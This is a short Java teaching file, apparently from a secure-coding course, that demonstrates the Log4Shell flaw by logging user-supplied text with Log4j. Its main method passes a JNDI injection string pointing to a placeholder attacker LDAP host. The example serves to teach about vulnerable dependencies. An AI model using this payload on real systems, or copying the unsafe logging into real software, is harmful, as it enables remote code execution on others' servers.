package com.basicsstrong.securecoding;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableComponent {
	//relying on trusted libraries
	//always using the lastest or most stable version
	//cvss : 10/10
	//JNDI
    private static final Logger logger = LogManager.getLogger(VulnerableComponent.class);

    public static void main(String[] args) {
    	performSearch("${jndi:ldap://attacker/maliciousObject}");
    }

    public static void performSearch(String searchText) {

    	logger.info("Search request for : {}",searchText);
    }
}
